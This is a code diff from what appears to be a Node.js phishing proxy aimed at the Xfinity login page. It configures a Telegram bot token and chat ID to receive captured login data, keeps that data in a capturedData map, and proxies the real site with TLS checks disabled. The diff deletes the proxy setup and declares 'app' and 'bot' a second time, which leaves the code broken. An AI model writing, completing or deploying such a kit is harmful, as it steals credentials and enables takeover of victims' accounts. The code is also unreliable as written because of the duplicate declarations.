@@ -16,18 +16,6 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://login.xfinity.com';
 
-// 2. Setup the proxy using that variable
-const proxy = createProxyMiddleware({
-  target: TARGET_WEBSITE, // Use the variable here!
-  changeOrigin: true,
-  secure: false,          // Helps with SSL issues on login pages
-  onProxyReq: fixRequestBody,
-  onProxyRes: function (proxyRes, req, res) {
-    // This prevents the "downloading file" issue
-    delete proxyRes.headers['content-disposition'];
-  }
-});
-
 // --- Essential Checks ---
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
   console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set as environment variables.");
@@ -39,6 +27,8 @@ const app = express();
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 
 // --- A temporary place to store login data ---
+const app = express();
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 const capturedData = new Map();
 
 // 1. Proxy goes FIRST
